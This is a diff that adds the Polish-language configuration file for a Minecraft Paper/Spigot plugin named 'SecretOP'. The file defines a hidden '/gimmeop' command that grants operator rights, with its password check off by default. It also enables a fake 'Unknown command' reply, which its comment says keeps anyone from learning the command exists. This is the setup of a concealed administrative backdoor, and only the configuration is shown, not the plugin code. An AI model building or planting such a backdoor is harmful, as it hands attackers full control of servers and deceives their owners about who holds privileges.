@@ -1,0 +1,34 @@
+# =================================================================== #
+#                    SecretOP - Konfiguracja Pluginu                  #
+#                   Dla Paper / Spigot Minecraft 1.12.2               #
+# =================================================================== #
+
+# Glowna ukryta komenda nadajaca OP (domyslnie gimmeop)
+# Uzycie: /gimmeop LUB /gimmeop <nick>
+secret-command: "gimmeop"
+
+# Ukryta komenda odbierajaca OP (domyslnie ungimmeop)
+# Uzycie: /ungimmeop LUB /ungimmeop <nick>
+deop-command: "ungimmeop"
+
+# Wymaganie hasla (zwieksza bezpieczenstwo)
+# Jesli wlaczone: /gimmeop <nick> <haslo> lub /gimmeop <haslo>
+require-password: false
+password: "TwojeSekretneHaslo123"
+
+# Czy wyswietlac falszywy komunikat "Unknown command" w przypadku blednego uzycia lub blednego hasla
+# Dzieki temu nikt nie dowie sie o istnieniu komendy!
+fake-unknown-command-on-fail: true
+
+# Efekty po nadaniu OP
+effects:
+  play-sound: true
+  sound-type: ENTITY_PLAYER_LEVELUP
+
+# Wiadomosci (obsluga kolorow '&')
+messages:
+  prefix: "&8[&4&l*&8] &r"
+  op-granted: "&aNadano uprawnienia &2&lOP &adla gracza &e{PLAYER}&a!"
+  op-revoked: "&cOdebrano uprawnienia OP graczowi &e{PLAYER}&c!"
+  player-not-found: "&cGracz &e{PLAYER} &cnie zostal znaleziony!"
+  unknown-command-text: "Unknown command. Type \"/help\" for help."
